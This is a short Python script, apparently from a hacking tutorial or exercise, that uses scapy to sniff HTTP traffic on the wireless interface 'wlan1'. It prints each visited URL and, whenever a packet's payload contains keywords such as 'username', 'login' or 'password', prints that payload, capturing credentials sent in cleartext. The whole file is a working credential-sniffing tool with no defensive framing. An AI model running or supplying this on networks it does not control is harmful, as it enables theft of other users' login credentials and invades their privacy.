import scapy.all as scapy
from scapy.layers import  http
def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if(packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords=["username","login","user","sign","pass","password"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn=process_sniffed_packet)


sniff("wlan1")
